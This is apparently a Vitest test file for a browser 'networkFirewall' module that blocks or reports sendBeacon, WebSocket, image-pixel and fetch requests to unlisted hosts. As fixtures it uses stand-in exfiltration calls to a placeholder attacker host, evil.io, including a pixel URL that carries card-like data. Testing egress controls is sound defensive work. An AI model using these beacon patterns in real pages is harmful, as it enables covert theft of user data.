import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { networkFirewall } from '../../modules/networkFirewall'
import { events } from '../../core/events'

describe('networkFirewall v2 channels', () => {
  const beacon = vi.fn(() => true)
  beforeEach(() => {
    events.reset()
    Object.defineProperty(navigator, 'sendBeacon', { configurable: true, writable: true, value: beacon })
    window.fetch = vi.fn(async () => new Response('ok')) as any
  })
  afterEach(() => networkFirewall.disable())

  it('blocks sendBeacon, WebSocket and image beacons to unknown hosts', () => {
    networkFirewall.enable({ allow: ['api.ok.com'] })
    expect(navigator.sendBeacon('https://evil.io/c', 'x')).toBe(false)
    expect(navigator.sendBeacon('https://api.ok.com/c', 'x')).toBe(true)
    expect(() => new WebSocket('wss://evil.io/ws')).toThrow(/blocked/)
    const img = new Image()
    img.src = 'https://evil.io/pixel.gif?cc=4111'
    expect(img.getAttribute('src')).toBeNull()
    img.setAttribute('src', 'https://evil.io/p2')
    expect(img.getAttribute('src')).toBeNull()
    img.src = 'data:image/gif;base64,R0lGOD'
    expect(img.getAttribute('src')).toContain('data:')
    expect(networkFirewall.getStats().blocked).toBe(4)
  })

  it('report mode reports but allows', async () => {
    const seen = vi.fn()
    events.on('request_reported', seen)
    networkFirewall.enable({ allow: [], mode: 'report' })
    await window.fetch('https://evil.io/x')
    expect(seen).toHaveBeenCalledTimes(1)
  })

  it('keeps WebSocket instanceof working and restores everything', () => {
    const OrigWS = window.WebSocket
    const origSetAttr = Element.prototype.setAttribute
    networkFirewall.enable({ allow: ['ws.ok.com'] })
    expect(window.WebSocket).not.toBe(OrigWS)
    expect(window.WebSocket.OPEN).toBe(1)
    networkFirewall.disable()
    expect(window.WebSocket).toBe(OrigWS)
    expect(Element.prototype.setAttribute).toBe(origSetAttr)
  })
})
